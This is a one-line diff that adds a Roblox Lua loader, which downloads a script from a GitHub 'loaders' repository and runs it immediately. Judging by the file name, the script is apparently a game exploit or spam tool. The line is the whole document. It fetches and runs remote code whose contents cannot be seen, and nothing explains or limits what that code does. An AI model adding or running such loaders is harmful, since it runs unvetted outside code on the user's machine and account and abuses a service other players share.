@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/x5-exp-event-sans-aus-fighter-2-spam3-t7ltm12fontend.lua"))()
